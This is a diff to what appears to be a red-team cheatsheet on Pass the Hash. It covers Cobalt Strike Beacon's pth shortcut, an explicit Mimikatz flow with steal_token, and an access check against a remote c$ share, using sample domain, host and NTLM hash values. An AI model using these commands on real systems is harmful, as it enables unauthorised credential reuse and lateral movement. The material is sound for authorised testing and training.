@@ -21,24 +21,24 @@ Windows associates a process token with a logon session through its Authenticati
 | NTLM allowed on the authentication path | Policy restrictions can prevent the technique |
 | Remote authorization | Authentication alone does not grant access to `c$` |
 
-Examples use `CONTOSO\rsteel` and `lon-ws-1`. Hashes are sample material from the notes. Obtain material only within the exercise scope; see [OS Credential Dumping](/cheatsheets/os-credential-dumping-cheatsheet/) for the preceding topic.
+Examples use `CONTOSO\rsteel` and `lon-ws-1`. Hashes are illustrative sample material. Obtain material only within the exercise scope; see [OS Credential Dumping](/cheatsheets/os-credential-dumping-cheatsheet/) for the preceding topic.
 
 ## 2. Beacon's pth shortcut
 
-The source notes use this Beacon shorthand for a Mimikatz-backed Pass the Hash operation. Command syntax and implementation can vary by Cobalt Strike version; check `help pth` in the installed version before use.
+This Beacon shorthand invokes a Mimikatz-backed Pass the Hash operation. Command syntax and implementation can vary by Cobalt Strike version; check `help pth` in the installed version before use.
 
 ```shell
 # Inspect the installed command syntax
 help pth
 
-# Source-note syntax; use only if supported by this version
+# Version-dependent shorthand; check the installed help first
 pth CONTOSO\rsteel fc525c9683e8fe067095ba2ddc971889
 
 # Verify the intended remote operation
 ls \\lon-ws-1\c$
 ```
 
-The notes show an access-denied result after the shortcut. This is a result from that example, not proof that the shortcut always fails or that the hash is invalid.
+An access-denied result after the shortcut does not prove that the shortcut always fails or that the hash is invalid.
 
 ## 3. Explicit Mimikatz flow
 
@@ -54,7 +54,7 @@ steal_token 1188
 
 # Verify access to the example share
 ls \\lon-ws-1\c$
-# The notes show a directory listing after selecting this token
+# A directory listing confirms access after selecting the intended token
 ```
 
 This path is an explicit way to select the resulting token. It is not inherently less detectable than the shortcut: it still uses Mimikatz, accesses authentication state and creates a process.
